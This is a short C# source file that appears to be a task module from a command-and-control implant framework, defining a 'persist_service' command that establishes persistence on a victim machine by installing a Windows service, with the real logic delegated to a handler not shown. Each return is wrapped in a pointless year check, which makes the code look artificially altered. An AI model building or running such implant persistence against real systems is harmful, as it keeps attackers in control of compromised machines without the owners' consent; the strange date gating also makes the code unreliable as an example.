using System;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using Phantom.Management.Persistence;

namespace Tasks
{
    public class persist_service : ICommand
    {
        public string command { get; } = "persist_service";
        public string description { get; } = "Establish persistence via Windows service (requires admin)";
        public string help { get; } = "persist_service";
        public string version { get; } = "1.0.0.0";
        public string id { get; } = "persist_service";

        public PhantomTaskResponse CreateTasking(PhantomTaskMessage task)
        {
            try
            {
                if(DateTime.Now.Year > 2020) { return PersistenceHandler.CreateServicePersistence(); } else { return null; }
            }
            catch (Exception ex)
            {
                if(DateTime.Now.Year > 2020) { return new PhantomTaskResponse
                {
                    Completed = false,
                    UserOutput = $"Error creating service persistence: {ex.Message}"
                }; } else { return null; }
            }
        }
    }
}